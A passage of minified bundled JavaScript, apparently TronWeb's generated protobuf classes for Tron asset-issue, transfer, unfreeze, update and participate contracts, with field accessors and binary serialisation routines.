            e.Message.initialize(this, i, 0, -1, null, null)
        }
        ,
        t.inherits(TronWebProto.ParticipateAssetIssueContract, e.Message),
        t.DEBUG && !COMPILED && (TronWebProto.ParticipateAssetIssueContract.displayName = "TronWebProto.ParticipateAssetIssueContract"),
        TronWebProto.AssetIssueContract.repeatedFields_ = [5],
        e.Message.GENERATE_TO_OBJECT && (TronWebProto.AssetIssueContract.prototype.toObject = function(i) {
            return TronWebProto.AssetIssueContract.toObject(i, this)
        }
        ,
        TronWebProto.AssetIssueContract.toObject = function(i, n) {
            var s = {
                id: e.Message.getFieldWithDefault(n, 41, ""),
                ownerAddress: n.getOwnerAddress_asB64(),
                name: n.getName_asB64(),
                abbr: n.getAbbr_asB64(),
                totalSupply: e.Message.getFieldWithDefault(n, 4, 0),
                frozenSupplyList: e.Message.toObjectList(n.getFrozenSupplyList(), TronWebProto.AssetIssueContract.FrozenSupply.toObject, i),
                trxNum: e.Message.getFieldWithDefault(n, 6, 0),
                precision: e.Message.getFieldWithDefault(n, 7, 0),
                num: e.Message.getFieldWithDefault(n, 8, 0),
                startTime: e.Message.getFieldWithDefault(n, 9, 0),
                endTime: e.Message.getFieldWithDefault(n, 10, 0),
                order: e.Message.getFieldWithDefault(n, 11, 0),
                voteScore: e.Message.getFieldWithDefault(n, 16, 0),
                description: n.getDescription_asB64(),
                url: n.getUrl_asB64(),
                freeAssetNetLimit: e.Message.getFieldWithDefault(n, 22, 0),
                publicFreeAssetNetLimit: e.Message.getFieldWithDefault(n, 23, 0),
                publicFreeAssetNetUsage: e.Message.getFieldWithDefault(n, 24, 0),
                publicLatestFreeNetTime: e.Message.getFieldWithDefault(n, 25, 0)
            };
            return i && (s.$jspbMessageInstance = n),
            s
        }
        ),
        TronWebProto.AssetIssueContract.deserializeBinary = function(i) {
            var n = new e.BinaryReader(i)
              , s = new TronWebProto.AssetIssueContract;
            return TronWebProto.AssetIssueContract.deserializeBinaryFromReader(s, n)
        }
        ,
        TronWebProto.AssetIssueContract.deserializeBinaryFromReader = function(i, n) {
            for (; n.nextField() && !n.isEndGroup(); ) {
                var s = n.getFieldNumber();
                switch (s) {
                case 41:
                    var a = n.readString();
                    i.setId(a);
                    break;
                case 1:
                    var a = n.readBytes();
                    i.setOwnerAddress(a);
                    break;
                case 2:
                    var a = n.readBytes();
                    i.setName(a);
                    break;
                case 3:
                    var a = n.readBytes();
                    i.setAbbr(a);
                    break;
                case 4:
                    var a = n.readInt64();
                    i.setTotalSupply(a);
                    break;
                case 5:
                    var a = new TronWebProto.AssetIssueContract.FrozenSupply;
                    n.readMessage(a, TronWebProto.AssetIssueContract.FrozenSupply.deserializeBinaryFromReader),
                    i.addFrozenSupply(a);
                    break;
                case 6:
                    var a = n.readInt32();
                    i.setTrxNum(a);
                    break;
                case 7:
                    var a = n.readInt32();
                    i.setPrecision(a);
                    break;
                case 8:
                    var a = n.readInt32();
                    i.setNum(a);
                    break;
                case 9:
                    var a = n.readInt64();
                    i.setStartTime(a);
                    break;
                case 10:
                    var a = n.readInt64();
                    i.setEndTime(a);
                    break;
                case 11:
                    var a = n.readInt64();
                    i.setOrder(a);
                    break;
                case 16:
                    var a = n.readInt32();
                    i.setVoteScore(a);
                    break;
                case 20:
                    var a = n.readBytes();
                    i.setDescription(a);
                    break;
                case 21:
                    var a = n.readBytes();
                    i.setUrl(a);
                    break;
                case 22:
                    var a = n.readInt64();
                    i.setFreeAssetNetLimit(a);
                    break;
                case 23:
                    var a = n.readInt64();
                    i.setPublicFreeAssetNetLimit(a);
                    break;
                case 24:
                    var a = n.readInt64();
                    i.setPublicFreeAssetNetUsage(a);
                    break;
                case 25:
                    var a = n.readInt64();
                    i.setPublicLatestFreeNetTime(a);
                    break;
                default:
                    n.skipField();
                    break
                }
            }
            return i
        }
        ,
        TronWebProto.AssetIssueContract.prototype.serializeBinary = function() {
            var i = new e.BinaryWriter;
            return TronWebProto.AssetIssueContract.serializeBinaryToWriter(this, i),
            i.getResultBuffer()
        }
        ,
        TronWebProto.AssetIssueContract.serializeBinaryToWriter = function(i, n) {
            var s = void 0;
            s = i.getId(),
            s.length > 0 && n.writeString(41, s),
            s = i.getOwnerAddress_asU8(),
            s.length > 0 && n.writeBytes(1, s),
            s = i.getName_asU8(),
            s.length > 0 && n.writeBytes(2, s),
            s = i.getAbbr_asU8(),
            s.length > 0 && n.writeBytes(3, s),
            s = i.getTotalSupply(),
            s !== 0 && n.writeInt64(4, s),
            s = i.getFrozenSupplyList(),
            s.length > 0 && n.writeRepeatedMessage(5, s, TronWebProto.AssetIssueContract.FrozenSupply.serializeBinaryToWriter),
            s = i.getTrxNum(),
            s !== 0 && n.writeInt32(6, s),
            s = i.getPrecision(),
            s !== 0 && n.writeInt32(7, s),
            s = i.getNum(),
            s !== 0 && n.writeInt32(8, s),
            s = i.getStartTime(),
            s !== 0 && n.writeInt64(9, s),
            s = i.getEndTime(),
            s !== 0 && n.writeInt64(10, s),
            s = i.getOrder(),
            s !== 0 && n.writeInt64(11, s),
            s = i.getVoteScore(),
            s !== 0 && n.writeInt32(16, s),
            s = i.getDescription_asU8(),
            s.length > 0 && n.writeBytes(20, s),
            s = i.getUrl_asU8(),
            s.length > 0 && n.writeBytes(21, s),
            s = i.getFreeAssetNetLimit(),
            s !== 0 && n.writeInt64(22, s),
            s = i.getPublicFreeAssetNetLimit(),
            s !== 0 && n.writeInt64(23, s),
            s = i.getPublicFreeAssetNetUsage(),
            s !== 0 && n.writeInt64(24, s),
            s = i.getPublicLatestFreeNetTime(),
            s !== 0 && n.writeInt64(25, s)
        }
        ,
        e.Message.GENERATE_TO_OBJECT && (TronWebProto.AssetIssueContract.FrozenSupply.prototype.toObject = function(i) {
            return TronWebProto.AssetIssueContract.FrozenSupply.toObject(i, this)
        }
        ,
        TronWebProto.AssetIssueContract.FrozenSupply.toObject = function(i, n) {
            var s = {
                frozenAmount: e.Message.getFieldWithDefault(n, 1, 0),
                frozenDays: e.Message.getFieldWithDefault(n, 2, 0)
            };
            return i && (s.$jspbMessageInstance = n),
            s
        }
        ),
        TronWebProto.AssetIssueContract.FrozenSupply.deserializeBinary = function(i) {
            var n = new e.BinaryReader(i)
              , s = new TronWebProto.AssetIssueContract.FrozenSupply;
            return TronWebProto.AssetIssueContract.FrozenSupply.deserializeBinaryFromReader(s, n)
        }
        ,
        TronWebProto.AssetIssueContract.FrozenSupply.deserializeBinaryFromReader = function(i, n) {
            for (; n.nextField() && !n.isEndGroup(); ) {
                var s = n.getFieldNumber();
                switch (s) {
                case 1:
                    var a = n.readInt64();
                    i.setFrozenAmount(a);
                    break;
                case 2:
                    var a = n.readInt64();
                    i.setFrozenDays(a);
                    break;
                default:
                    n.skipField();
                    break
                }
            }
            return i
        }
        ,
        TronWebProto.AssetIssueContract.FrozenSupply.prototype.serializeBinary = function() {
            var i = new e.BinaryWriter;
            return TronWebProto.AssetIssueContract.FrozenSupply.serializeBinaryToWriter(this, i),
            i.getResultBuffer()
        }
        ,
        TronWebProto.AssetIssueContract.FrozenSupply.serializeBinaryToWriter = function(i, n) {
            var s = void 0;
            s = i.getFrozenAmount(),
            s !== 0 && n.writeInt64(1, s),
            s = i.getFrozenDays(),
            s !== 0 && n.writeInt64(2, s)
        }
        ,
        TronWebProto.AssetIssueContract.FrozenSupply.prototype.getFrozenAmount = function() {
            return e.Message.getFieldWithDefault(this, 1, 0)
        }
        ,
        TronWebProto.AssetIssueContract.FrozenSupply.prototype.setFrozenAmount = function(i) {
            return e.Message.setProto3IntField(this, 1, i)
        }
        ,
        TronWebProto.AssetIssueContract.FrozenSupply.prototype.getFrozenDays = function() {
            return e.Message.getFieldWithDefault(this, 2, 0)
        }
        ,
        TronWebProto.AssetIssueContract.FrozenSupply.prototype.setFrozenDays = function(i) {
            return e.Message.setProto3IntField(this, 2, i)
        }
        ,
        TronWebProto.AssetIssueContract.prototype.getId = function() {
            return e.Message.getFieldWithDefault(this, 41, "")
        }
        ,
        TronWebProto.AssetIssueContract.prototype.setId = function(i) {
            return e.Message.setProto3StringField(this, 41, i)
        }
        ,
        TronWebProto.AssetIssueContract.prototype.getOwnerAddress = function() {
            return e.Message.getFieldWithDefault(this, 1, "")
        }
        ,
        TronWebProto.AssetIssueContract.prototype.getOwnerAddress_asB64 = function() {
            return e.Message.bytesAsB64(this.getOwnerAddress())
        }
        ,
        TronWebProto.AssetIssueContract.prototype.getOwnerAddress_asU8 = function() {
            return e.Message.bytesAsU8(this.getOwnerAddress())
        }
        ,
        TronWebProto.AssetIssueContract.prototype.setOwnerAddress = function(i) {
            return e.Message.setProto3BytesField(this, 1, i)
        }
        ,
        TronWebProto.AssetIssueContract.prototype.getName = function() {
            return e.Message.getFieldWithDefault(this, 2, "")
        }
        ,
        TronWebProto.AssetIssueContract.prototype.getName_asB64 = function() {
            return e.Message.bytesAsB64(this.getName())
        }
        ,
        TronWebProto.AssetIssueContract.prototype.getName_asU8 = function() {
            return e.Message.bytesAsU8(this.getName())
        }
        ,
        TronWebProto.AssetIssueContract.prototype.setName = function(i) {
            return e.Message.setProto3BytesField(this, 2, i)
        }
        ,
        TronWebProto.AssetIssueContract.prototype.getAbbr = function() {
            return e.Message.getFieldWithDefault(this, 3, "")
        }
        ,
        TronWebProto.AssetIssueContract.prototype.getAbbr_asB64 = function() {
            return e.Message.bytesAsB64(this.getAbbr())
        }
        ,
        TronWebProto.AssetIssueContract.prototype.getAbbr_asU8 = function() {
            return e.Message.bytesAsU8(this.getAbbr())
        }
        ,
        TronWebProto.AssetIssueContract.prototype.setAbbr = function(i) {
            return e.Message.setProto3BytesField(this, 3, i)
        }
        ,
        TronWebProto.AssetIssueContract.prototype.getTotalSupply = function() {
            return e.Message.getFieldWithDefault(this, 4, 0)
        }
        ,
        TronWebProto.AssetIssueContract.prototype.setTotalSupply = function(i) {
            return e.Message.setProto3IntField(this, 4, i)
        }
        ,
        TronWebProto.AssetIssueContract.prototype.getFrozenSupplyList = function() {
            return e.Message.getRepeatedWrapperField(this, TronWebProto.AssetIssueContract.FrozenSupply, 5)
        }
        ,
        TronWebProto.AssetIssueContract.prototype.setFrozenSupplyList = function(i) {
            return e.Message.setRepeatedWrapperField(this, 5, i)
        }
        ,
        TronWebProto.AssetIssueContract.prototype.addFrozenSupply = function(i, n) {
            return e.Message.addToRepeatedWrapperField(this, 5, i, TronWebProto.AssetIssueContract.FrozenSupply, n)
        }
        ,
        TronWebProto.AssetIssueContract.prototype.clearFrozenSupplyList = function() {
            return this.setFrozenSupplyList([])
        }
        ,
        TronWebProto.AssetIssueContract.prototype.getTrxNum = function() {
            return e.Message.getFieldWithDefault(this, 6, 0)
        }
        ,
        TronWebProto.AssetIssueContract.prototype.setTrxNum = function(i) {
            return e.Message.setProto3IntField(this, 6, i)
        }
        ,
        TronWebProto.AssetIssueContract.prototype.getPrecision = function() {
            return e.Message.getFieldWithDefault(this, 7, 0)
        }
        ,
        TronWebProto.AssetIssueContract.prototype.setPrecision = function(i) {
            return e.Message.setProto3IntField(this, 7, i)
        }
        ,
        TronWebProto.AssetIssueContract.prototype.getNum = function() {
            return e.Message.getFieldWithDefault(this, 8, 0)
        }
        ,
        TronWebProto.AssetIssueContract.prototype.setNum = function(i) {
            return e.Message.setProto3IntField(this, 8, i)
        }
        ,
        TronWebProto.AssetIssueContract.prototype.getStartTime = function() {
            return e.Message.getFieldWithDefault(this, 9, 0)
        }
        ,
        TronWebProto.AssetIssueContract.prototype.setStartTime = function(i) {
            return e.Message.setProto3IntField(this, 9, i)
        }
        ,
        TronWebProto.AssetIssueContract.prototype.getEndTime = function() {
            return e.Message.getFieldWithDefault(this, 10, 0)
        }
        ,
        TronWebProto.AssetIssueContract.prototype.setEndTime = function(i) {
            return e.Message.setProto3IntField(this, 10, i)
        }
        ,
        TronWebProto.AssetIssueContract.prototype.getOrder = function() {
            return e.Message.getFieldWithDefault(this, 11, 0)
        }
        ,
        TronWebProto.AssetIssueContract.prototype.setOrder = function(i) {
            return e.Message.setProto3IntField(this, 11, i)
        }
        ,
        TronWebProto.AssetIssueContract.prototype.getVoteScore = function() {
            return e.Message.getFieldWithDefault(this, 16, 0)
        }
        ,
        TronWebProto.AssetIssueContract.prototype.setVoteScore = function(i) {
            return e.Message.setProto3IntField(this, 16, i)
        }
        ,
        TronWebProto.AssetIssueContract.prototype.getDescription = function() {
            return e.Message.getFieldWithDefault(this, 20, "")
        }
        ,
        TronWebProto.AssetIssueContract.prototype.getDescription_asB64 = function() {
            return e.Message.bytesAsB64(this.getDescription())
        }
        ,
        TronWebProto.AssetIssueContract.prototype.getDescription_asU8 = function() {
            return e.Message.bytesAsU8(this.getDescription())
        }
        ,
        TronWebProto.AssetIssueContract.prototype.setDescription = function(i) {
            return e.Message.setProto3BytesField(this, 20, i)
        }
        ,
        TronWebProto.AssetIssueContract.prototype.getUrl = function() {
            return e.Message.getFieldWithDefault(this, 21, "")
        }
        ,
        TronWebProto.AssetIssueContract.prototype.getUrl_asB64 = function() {
            return e.Message.bytesAsB64(this.getUrl())
        }
        ,
        TronWebProto.AssetIssueContract.prototype.getUrl_asU8 = function() {
            return e.Message.bytesAsU8(this.getUrl())
        }
        ,
        TronWebProto.AssetIssueContract.prototype.setUrl = function(i) {
            return e.Message.setProto3BytesField(this, 21, i)
        }
        ,
        TronWebProto.AssetIssueContract.prototype.getFreeAssetNetLimit = function() {
            return e.Message.getFieldWithDefault(this, 22, 0)
        }
        ,
        TronWebProto.AssetIssueContract.prototype.setFreeAssetNetLimit = function(i) {
            return e.Message.setProto3IntField(this, 22, i)
        }
        ,
        TronWebProto.AssetIssueContract.prototype.getPublicFreeAssetNetLimit = function() {
            return e.Message.getFieldWithDefault(this, 23, 0)
        }
        ,
        TronWebProto.AssetIssueContract.prototype.setPublicFreeAssetNetLimit = function(i) {
            return e.Message.setProto3IntField(this, 23, i)
        }
        ,
        TronWebProto.AssetIssueContract.prototype.getPublicFreeAssetNetUsage = function() {
            return e.Message.getFieldWithDefault(this, 24, 0)
        }
        ,
        TronWebProto.AssetIssueContract.prototype.setPublicFreeAssetNetUsage = function(i) {
            return e.Message.setProto3IntField(this, 24, i)
        }
        ,
        TronWebProto.AssetIssueContract.prototype.getPublicLatestFreeNetTime = function() {
            return e.Message.getFieldWithDefault(this, 25, 0)
        }
        ,
        TronWebProto.AssetIssueContract.prototype.setPublicLatestFreeNetTime = function(i) {
            return e.Message.setProto3IntField(this, 25, i)
        }
        ,
        e.Message.GENERATE_TO_OBJECT && (TronWebProto.TransferAssetContract.prototype.toObject = function(i) {
            return TronWebProto.TransferAssetContract.toObject(i, this)
        }
        ,
        TronWebProto.TransferAssetContract.toObject = function(i, n) {
            var s = {
                assetName: n.getAssetName_asB64(),
                ownerAddress: n.getOwnerAddress_asB64(),
                toAddress: n.getToAddress_asB64(),
                amount: e.Message.getFieldWithDefault(n, 4, 0)
            };
            return i && (s.$jspbMessageInstance = n),
            s
        }
        ),
        TronWebProto.TransferAssetContract.deserializeBinary = function(i) {
            var n = new e.BinaryReader(i)
              , s = new TronWebProto.TransferAssetContract;
            return TronWebProto.TransferAssetContract.deserializeBinaryFromReader(s, n)
        }
        ,
        TronWebProto.TransferAssetContract.deserializeBinaryFromReader = function(i, n) {
            for (; n.nextField() && !n.isEndGroup(); ) {
                var s = n.getFieldNumber();
                switch (s) {
                case 1:
                    var a = n.readBytes();
                    i.setAssetName(a);
                    break;
                case 2:
                    var a = n.readBytes();
                    i.setOwnerAddress(a);
                    break;
                case 3:
                    var a = n.readBytes();
                    i.setToAddress(a);
                    break;
                case 4:
                    var a = n.readInt64();
                    i.setAmount(a);
                    break;
                default:
                    n.skipField();
                    break
                }
            }
            return i
        }
        ,
        TronWebProto.TransferAssetContract.prototype.serializeBinary = function() {
            var i = new e.BinaryWriter;
            return TronWebProto.TransferAssetContract.serializeBinaryToWriter(this, i),
            i.getResultBuffer()
        }
        ,
        TronWebProto.TransferAssetContract.serializeBinaryToWriter = function(i, n) {
            var s = void 0;
            s = i.getAssetName_asU8(),
            s.length > 0 && n.writeBytes(1, s),
            s = i.getOwnerAddress_asU8(),
            s.length > 0 && n.writeBytes(2, s),
            s = i.getToAddress_asU8(),
            s.length > 0 && n.writeBytes(3, s),
            s = i.getAmount(),
            s !== 0 && n.writeInt64(4, s)
        }
        ,
        TronWebProto.TransferAssetContract.prototype.getAssetName = function() {
            return e.Message.getFieldWithDefault(this, 1, "")
        }
        ,
        TronWebProto.TransferAssetContract.prototype.getAssetName_asB64 = function() {
            return e.Message.bytesAsB64(this.getAssetName())
        }
        ,
        TronWebProto.TransferAssetContract.prototype.getAssetName_asU8 = function() {
            return e.Message.bytesAsU8(this.getAssetName())
        }
        ,
        TronWebProto.TransferAssetContract.prototype.setAssetName = function(i) {
            return e.Message.setProto3BytesField(this, 1, i)
        }
        ,
        TronWebProto.TransferAssetContract.prototype.getOwnerAddress = function() {
            return e.Message.getFieldWithDefault(this, 2, "")
        }
        ,
        TronWebProto.TransferAssetContract.prototype.getOwnerAddress_asB64 = function() {
            return e.Message.bytesAsB64(this.getOwnerAddress())
        }
        ,
        TronWebProto.TransferAssetContract.prototype.getOwnerAddress_asU8 = function() {
            return e.Message.bytesAsU8(this.getOwnerAddress())
        }
        ,
        TronWebProto.TransferAssetContract.prototype.setOwnerAddress = function(i) {
            return e.Message.setProto3BytesField(this, 2, i)
        }
        ,
        TronWebProto.TransferAssetContract.prototype.getToAddress = function() {
            return e.Message.getFieldWithDefault(this, 3, "")
        }
        ,
        TronWebProto.TransferAssetContract.prototype.getToAddress_asB64 = function() {
            return e.Message.bytesAsB64(this.getToAddress())
        }
        ,
        TronWebProto.TransferAssetContract.prototype.getToAddress_asU8 = function() {
            return e.Message.bytesAsU8(this.getToAddress())
        }
        ,
        TronWebProto.TransferAssetContract.prototype.setToAddress = function(i) {
            return e.Message.setProto3BytesField(this, 3, i)
        }
        ,
        TronWebProto.TransferAssetContract.prototype.getAmount = function() {
            return e.Message.getFieldWithDefault(this, 4, 0)
        }
        ,
        TronWebProto.TransferAssetContract.prototype.setAmount = function(i) {
            return e.Message.setProto3IntField(this, 4, i)
        }
        ,
        e.Message.GENERATE_TO_OBJECT && (TronWebProto.UnfreezeAssetContract.prototype.toObject = function(i) {
            return TronWebProto.UnfreezeAssetContract.toObject(i, this)
        }
        ,
        TronWebProto.UnfreezeAssetContract.toObject = function(i, n) {
            var s = {
                ownerAddress: n.getOwnerAddress_asB64()
            };
            return i && (s.$jspbMessageInstance = n),
            s
        }
        ),
        TronWebProto.UnfreezeAssetContract.deserializeBinary = function(i) {
            var n = new e.BinaryReader(i)
              , s = new TronWebProto.UnfreezeAssetContract;
            return TronWebProto.UnfreezeAssetContract.deserializeBinaryFromReader(s, n)
        }
        ,
        TronWebProto.UnfreezeAssetContract.deserializeBinaryFromReader = function(i, n) {
            for (; n.nextField() && !n.isEndGroup(); ) {
                var s = n.getFieldNumber();
                switch (s) {
                case 1:
                    var a = n.readBytes();
                    i.setOwnerAddress(a);
                    break;
                default:
                    n.skipField();
                    break
                }
            }
            return i
        }
        ,
        TronWebProto.UnfreezeAssetContract.prototype.serializeBinary = function() {
            var i = new e.BinaryWriter;
            return TronWebProto.UnfreezeAssetContract.serializeBinaryToWriter(this, i),
            i.getResultBuffer()
        }
        ,
        TronWebProto.UnfreezeAssetContract.serializeBinaryToWriter = function(i, n) {
            var s = void 0;
            s = i.getOwnerAddress_asU8(),
            s.length > 0 && n.writeBytes(1, s)
        }
        ,
        TronWebProto.UnfreezeAssetContract.prototype.getOwnerAddress = function() {
            return e.Message.getFieldWithDefault(this, 1, "")
        }
        ,
        TronWebProto.UnfreezeAssetContract.prototype.getOwnerAddress_asB64 = function() {
            return e.Message.bytesAsB64(this.getOwnerAddress())
        }
        ,
        TronWebProto.UnfreezeAssetContract.prototype.getOwnerAddress_asU8 = function() {
            return e.Message.bytesAsU8(this.getOwnerAddress())
        }
        ,
        TronWebProto.UnfreezeAssetContract.prototype.setOwnerAddress = function(i) {
            return e.Message.setProto3BytesField(this, 1, i)
        }
        ,
        e.Message.GENERATE_TO_OBJECT && (TronWebProto.UpdateAssetContract.prototype.toObject = function(i) {
            return TronWebProto.UpdateAssetContract.toObject(i, this)
        }
        ,
        TronWebProto.UpdateAssetContract.toObject = function(i, n) {
            var s = {
                ownerAddress: n.getOwnerAddress_asB64(),
                description: n.getDescription_asB64(),
                url: n.getUrl_asB64(),
                newLimit: e.Message.getFieldWithDefault(n, 4, 0),
                newPublicLimit: e.Message.getFieldWithDefault(n, 5, 0)
            };
            return i && (s.$jspbMessageInstance = n),
            s
        }
        ),
        TronWebProto.UpdateAssetContract.deserializeBinary = function(i) {
            var n = new e.BinaryReader(i)
              , s = new TronWebProto.UpdateAssetContract;
            return TronWebProto.UpdateAssetContract.deserializeBinaryFromReader(s, n)
        }
        ,
        TronWebProto.UpdateAssetContract.deserializeBinaryFromReader = function(i, n) {
            for (; n.nextField() && !n.isEndGroup(); ) {
                var s = n.getFieldNumber();
                switch (s) {
                case 1:
                    var a = n.readBytes();
                    i.setOwnerAddress(a);
                    break;
                case 2:
                    var a = n.readBytes();
                    i.setDescription(a);
                    break;
                case 3:
                    var a = n.readBytes();
                    i.setUrl(a);
                    break;
                case 4:
                    var a = n.readInt64();
                    i.setNewLimit(a);
                    break;
                case 5:
                    var a = n.readInt64();
                    i.setNewPublicLimit(a);
                    break;
                default:
                    n.skipField();
                    break
                }
            }
            return i
        }
        ,
        TronWebProto.UpdateAssetContract.prototype.serializeBinary = function() {
            var i = new e.BinaryWriter;
            return TronWebProto.UpdateAssetContract.serializeBinaryToWriter(this, i),
            i.getResultBuffer()
        }
        ,
        TronWebProto.UpdateAssetContract.serializeBinaryToWriter = function(i, n) {
            var s = void 0;
            s = i.getOwnerAddress_asU8(),
            s.length > 0 && n.writeBytes(1, s),
            s = i.getDescription_asU8(),
            s.length > 0 && n.writeBytes(2, s),
            s = i.getUrl_asU8(),
            s.length > 0 && n.writeBytes(3, s),
            s = i.getNewLimit(),
            s !== 0 && n.writeInt64(4, s),
            s = i.getNewPublicLimit(),
            s !== 0 && n.writeInt64(5, s)
        }
        ,
        TronWebProto.UpdateAssetContract.prototype.getOwnerAddress = function() {
            return e.Message.getFieldWithDefault(this, 1, "")
        }
        ,
        TronWebProto.UpdateAssetContract.prototype.getOwnerAddress_asB64 = function() {
            return e.Message.bytesAsB64(this.getOwnerAddress())
        }
        ,
        TronWebProto.UpdateAssetContract.prototype.getOwnerAddress_asU8 = function() {
            return e.Message.bytesAsU8(this.getOwnerAddress())
        }
        ,
        TronWebProto.UpdateAssetContract.prototype.setOwnerAddress = function(i) {
            return e.Message.setProto3BytesField(this, 1, i)
        }
        ,
        TronWebProto.UpdateAssetContract.prototype.getDescription = function() {
            return e.Message.getFieldWithDefault(this, 2, "")
        }
        ,
        TronWebProto.UpdateAssetContract.prototype.getDescription_asB64 = function() {
            return e.Message.bytesAsB64(this.getDescription())
        }
        ,
        TronWebProto.UpdateAssetContract.prototype.getDescription_asU8 = function() {
            return e.Message.bytesAsU8(this.getDescription())
        }
        ,
        TronWebProto.UpdateAssetContract.prototype.setDescription = function(i) {
            return e.Message.setProto3BytesField(this, 2, i)
        }
        ,
        TronWebProto.UpdateAssetContract.prototype.getUrl = function() {
            return e.Message.getFieldWithDefault(this, 3, "")
        }
        ,
        TronWebProto.UpdateAssetContract.prototype.getUrl_asB64 = function() {
            return e.Message.bytesAsB64(this.getUrl())
        }
        ,
        TronWebProto.UpdateAssetContract.prototype.getUrl_asU8 = function() {
            return e.Message.bytesAsU8(this.getUrl())
        }
        ,
        TronWebProto.UpdateAssetContract.prototype.setUrl = function(i) {
            return e.Message.setProto3BytesField(this, 3, i)
        }
        ,
        TronWebProto.UpdateAssetContract.prototype.getNewLimit = function() {
            return e.Message.getFieldWithDefault(this, 4, 0)
        }
        ,
        TronWebProto.UpdateAssetContract.prototype.setNewLimit = function(i) {
            return e.Message.setProto3IntField(this, 4, i)
        }
        ,
        TronWebProto.UpdateAssetContract.prototype.getNewPublicLimit = function() {
            return e.Message.getFieldWithDefault(this, 5, 0)
        }
        ,
        TronWebProto.UpdateAssetContract.prototype.setNewPublicLimit = function(i) {
            return e.Message.setProto3IntField(this, 5, i)
        }
        ,
        e.Message.GENERATE_TO_OBJECT && (TronWebProto.ParticipateAssetIssueContract.prototype.toObject = function(i) {
            return TronWebProto.ParticipateAssetIssueContract.toObject(i, this)
        }
        ,
        TronWebProto.ParticipateAssetIssueContract.toObject = function(i, n) {
            var s = {
                ownerAddress: n.getOwnerAddress_asB64(),
                toAddress: n.getToAddress_asB64(),
                assetName: n.getAssetName_asB64(),
                amount: e.Message.getFieldWithDefault(n, 4, 0)
            };
            return i && (s.$jspbMessageInstance = n),
            s
        }
        ),
        TronWebProto.ParticipateAssetIssueContract.deserializeBinary = function(i) {
            var n = new e.BinaryReader(i)
              , s = new TronWebProto.ParticipateAssetIssueContract;
            return TronWebProto.ParticipateAssetIssueContract.deserializeBinaryFromReader(s, n)
        }
        ,
        TronWebProto.ParticipateAssetIssueContract.deserializeBinaryFromReader = function(i, n) {
            for (; n.nextField() && !n.isEndGroup(); ) {
                var s = n.getFieldNumber();
                switch (s) {
                case 1:
                    var a = n.readBytes();
                    i.setOwnerAddress(a);
                    break;
                case 2:
                    var a = n.readBytes();
                    i.setToAddress(a);
                    break;
                case 3:
                    var a = n.readBytes();
                    i.setAssetName(a);
                    break;
                case 4:
                    var a = n.readInt64();
                    i.setAmount(a);
                    break;
                default:
                    n.skipField();
                    break
                }
            }
            return i
        }
        ,
        TronWebProto.ParticipateAssetIssueContract.prototype.serializeBinary = function() {
            var i = new e.BinaryWriter;
            return TronWebProto.ParticipateAssetIssueContract.serializeBinaryToWriter(this, i),
            i.getResultBuffer()
        }
        ,
        TronWebProto.ParticipateAssetIssueContract.serializeBinaryToWriter = function(i, n) {
            var s = void 0;
            s = i.getOwnerAddress_asU8(),
            s.length > 0 && n.writeBytes(1, s),
            s = i.getToAddress_asU8(),
            s.length > 0 && n.writeBytes(2, s),
            s = i.getAssetName_asU8(),
            s.length > 0 && n.writeBytes(3, s),
            s = i.getAmount(),
            s !== 0 && n.writeInt64(4, s)
        }
        ,
        TronWebProto.ParticipateAssetIssueContract.prototype.getOwnerAddress = function() {
            return e.Message.getFieldWithDefault(this, 1, "")
        }
        ,
        TronWebProto.ParticipateAssetIssueContract.prototype.getOwnerAddress_asB64 = function() {
            return e.Message.bytesAsB64(this.getOwnerAddress())
        }
        ,
        TronWebProto.ParticipateAssetIssueContract.prototype.getOwnerAddress_asU8 = function() {
            return e.Message.bytesAsU8(this.getOwnerAddress())
        }
        ,
        TronWebProto.ParticipateAssetIssueContract.prototype.setOwnerAddress = function(i) {
            return e.Message.setProto3BytesField(this, 1, i)
        }
        ,
        TronWebProto.ParticipateAssetIssueContract.prototype.getToAddress = function() {
            return e.Message.getFieldWithDefault(this, 2, "")
        }
        ,
        TronWebProto.ParticipateAssetIssueContract.prototype.getToAddress_asB64 = function() {
            return e.Message.bytesAsB64(this.getToAddress())
        }
        ,
        TronWebProto.ParticipateAssetIssueContract.prototype.getToAddress_asU8 = function() {
            return e.Message.bytesAsU8(this.getToAddress())
        }
        ,
        TronWebProto.ParticipateAssetIssueContract.prototype.setToAddress = function(i) {
            return e.Message.setProto3BytesField(this, 2, i)
        }
        ,
        TronWebProto.ParticipateAssetIssueContract.prototype.getAssetName = function() {
            return e.Message.getFieldWithDefault(this, 3, "")
        }
        ,
        TronWebProto.ParticipateAssetIssueContract.prototype.getAssetName_asB64 = function() {
            return e.Message.bytesAsB64(this.getAssetName())
        }
        ,
        TronWebProto.ParticipateAssetIssueContract.prototype.getAssetName_asU8 = function() {
            return e.Message.bytesAsU8(this.getAssetName())
        }
        ,
        TronWebProto.ParticipateAssetIssueContract.prototype.setAssetName = function(i) {
            return e.Message.setProto3BytesField(this, 3, i)
        }
        ,
        TronWebProto.ParticipateAssetIssueContract.prototype.getAmount = function() {
            return e.Message.getFieldWithDefault(this, 4, 0)
        }
        ,
        TronWebProto.ParticipateAssetIssueContract.prototype.setAmount = function(i) {
            return e.Message.setProto3IntField(this, 4, i)
        }
        ,
        t.object.extend(r, TronWebProto)
    }(KT)),
    KT
}
Sge();
var ZT = {}, yW;
function Bge() {
    return yW || (yW = 1,
    function(r) {
        var e = ys()
          , t = e
          , o = typeof globalThis < "u" && globalThis || typeof window < "u" && window || typeof o < "u" && o || typeof self < "u" && self || (function() {
            return this
        }
        ).call(null) || Function("return this")()
          , i = A4();
        t.object.extend(proto, i),
        t.exportSymbol("TronWebProto.ClearABIContract", null, o),
        t.exportSymbol("TronWebProto.ContractState", null, o),
        t.exportSymbol("TronWebProto.CreateSmartContract", null, o),
        t.exportSymbol("TronWebProto.SmartContract", null, o),
        t.exportSymbol("TronWebProto.SmartContract.ABI", null, o),
        t.exportSymbol("TronWebProto.SmartContract.ABI.Entry", null, o),
        t.exportSymbol("TronWebProto.SmartContract.ABI.Entry.EntryType", null, o),
        t.exportSymbol("TronWebProto.SmartContract.ABI.Entry.Param", null, o),
        t.exportSymbol("TronWebProto.SmartContract.ABI.Entry.StateMutabilityType", null, o),
        t.exportSymbol("TronWebProto.SmartContractDataWrapper", null, o),
        t.exportSymbol("TronWebProto.TriggerSmartContract", null, o),
        t.exportSymbol("TronWebProto.UpdateEnergyLimitContract", null, o),
        t.exportSymbol("TronWebProto.UpdateSettingContract", null, o),
        TronWebProto.SmartContract = function(n) {
            e.Message.initialize(this, n, 0, -1, null, null)
        }
        ,
        t.inherits(TronWebProto.SmartContract, e.Message),
